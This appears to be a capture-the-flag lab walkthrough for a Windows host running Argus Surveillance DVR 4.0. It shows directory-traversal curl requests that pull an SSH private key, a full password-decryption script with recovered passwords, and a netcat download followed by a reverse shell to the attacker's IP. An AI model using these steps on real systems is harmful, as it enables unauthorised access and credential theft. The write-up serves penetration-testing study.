---
icon: windows
---

# DVR4 - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.179 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 14:43 EDT
Nmap scan report for 192.168.231.179
Host is up (0.031s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|7|2008|8.1 (98%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (98%), Microsoft Windows 10 1909 (91%), Microsoft Windows Server 2019 (90%), Microsoft Windows 10 1903 - 21H1 (90%), Microsoft Windows 10 1709 - 21H2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 20H2 - 21H1 (88%), Microsoft Windows 10 21H2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-06T18:46:40
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   33.69 ms 192.168.45.1
2   33.65 ms 192.168.45.254
3   33.93 ms 192.168.251.1
4   34.17 ms 192.168.231.179
```

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2458).png" alt=""><figcaption></figcaption></figure>

Upon visiting the site we were able to get the version from the About page

After searching vulnerabilities associated with Argus Surveillance DVR v 4.0, I found four known vulnerabilities listed on ExploitDB

<figure><img src="../../.gitbook/assets/image (2459).png" alt=""><figcaption></figcaption></figure>

I am going to Check out the Directory Traversal Exploit

### <mark style="color:$primary;">Argus Surveillance DVR 4.0 Directory Traversal</mark>

```
searchsploit -m 45296
```

The exploit provides us with a poc. I'll try and use it to view the /etc/hosts file

```
curl "http://192.168.231.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2FDrivers%2Fetc%2Fhosts&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

<figure><img src="../../.gitbook/assets/image (2460).png" alt=""><figcaption></figcaption></figure>

It works! SSH is open on this box let's try to retrieve someone's SSH key

<figure><img src="../../.gitbook/assets/image (2461).png" alt=""><figcaption></figcaption></figure>

The Users page reveals 2 possible users!

Using the **Administrator** user, I was able to read the `proof.txt` file directly. However, there were no SSH private keys available under this user.

But I did find one for Viewer&#x20;

```
curl "http://192.168.231.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

<figure><img src="../../.gitbook/assets/image (2462).png" alt=""><figcaption></figcaption></figure>

I'll save the file as id\_rsa as set its permissions to 600

```
curl -o id_rsa "http://192.168.231.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

<figure><img src="../../.gitbook/assets/image (2463).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2464).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

We discovered a Privesc Exploit earlie on Searchsploit. I am going to download it

```
searchsploit -m 50130.py
```

### <mark style="color:$primary;">Argus Surveillance DVR 4.0 Weak Password Encryption</mark>

<figure><img src="../../.gitbook/assets/image (2465).png" alt=""><figcaption></figcaption></figure>

An exploit for weak password encryption notes config file location where encrypted passwords are stored **`C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`**

```
cd "C:\ProgramData\PY_Software\Argus Surveillance DVR"
```

<figure><img src="../../.gitbook/assets/image (2466).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2467).png" alt=""><figcaption></figcaption></figure>

Found two encrypted passwords for Administrator and Viewer

I'll modify the python code to include the Administrator's hash

<figure><img src="../../.gitbook/assets/image (2468).png" alt=""><figcaption></figcaption></figure>

```
python3 50130.py
```

<figure><img src="../../.gitbook/assets/image (2469).png" alt=""><figcaption></figcaption></figure>

```
14WatchD0g
```

**Note:** One character appears to be unrecognized, likely due to a special character not supported by the current decryption method.

Now I'll try to Decrypt the Viewer's hash

<figure><img src="../../.gitbook/assets/image (2470).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2471).png" alt=""><figcaption></figcaption></figure>

```
python3 50130.py
```

<figure><img src="../../.gitbook/assets/image (2472).png" alt=""><figcaption></figcaption></figure>

```
ImWatchingY0u
```

i tried using the viewer's password to get administrator access via runas but it failed. So I need to decrypt the special character in order to recoved the full password for the admin user

Below is the complete version of the **modified decryptor script** that includes special character as well

```
characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y',
'C9C4':'Z','F641':'a','6C6A':'b','D9BD':'c','418D':'d',
'B740':'e','E1D0':'f','3CD9':'g','956B':'h','C875':'i',
'696C':'j','906B':'k','3F7E':'l','4D7B':'m','EB60':'n',
'8998':'o','7196':'p','B657':'q','CA79':'r','9083':'s',
'E03B':'t','AAFE':'u','F787':'v','C165':'w','A935':'x',
'B734':'y','E4BC':'z','!':'B398', 'B398':'!','F79A':'*',
'ECEC':'_','AF71':'~','78A7':'@','E06F':'`','D9A8':'$'}


# ASCII art is important xD
banner = '''
#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
'''
print(banner)

# Change this :)
pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
if (len(pass_hash)%4) != 0:
 print("[!] Error, check your password hash")
 exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
 split.append(pass_hash[index : index + n])

password = ""
for key in split:
 if key in characters.keys():
  password += characters[key]
  print("[+] " + key + ":" + characters[key])
 else:
  print("[-] " + key + ":Unknown")

print(password)
```

let's try it again&#x20;

```
python3 50130.py 
```

<figure><img src="../../.gitbook/assets/image (2473).png" alt=""><figcaption></figcaption></figure>

```
14WatchD0g$
```

Nice now we have the administrator's password I will use runas and nc64.exe to get a shell as the administrator user.

```
iwr -uri http://192.168.45.158/nc64.exe -outfile nc64.exe
```

<figure><img src="../../.gitbook/assets/image (2474).png" alt=""><figcaption></figcaption></figure>

```
runas /user:administrator "nc64.exe -e cmd 192.168.45.158 443"
```

<figure><img src="../../.gitbook/assets/image (2475).png" alt=""><figcaption></figcaption></figure>
